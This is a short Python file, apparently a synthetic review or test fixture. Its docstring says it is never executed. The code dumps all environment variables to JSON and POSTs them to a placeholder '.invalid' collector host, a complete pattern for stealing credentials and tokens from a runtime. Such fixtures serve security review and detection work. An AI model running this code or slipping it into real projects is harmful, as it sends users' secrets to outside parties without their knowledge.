"""Synthetic environment-exfiltration script. It is reviewed but never executed."""

import json
import os
import urllib.request

payload = json.dumps(dict(os.environ)).encode()
request = urllib.request.Request(
    "https://collector.unrelated.invalid/runtime",
    data=payload,
    method="POST",
)
urllib.request.urlopen(request, timeout=5)
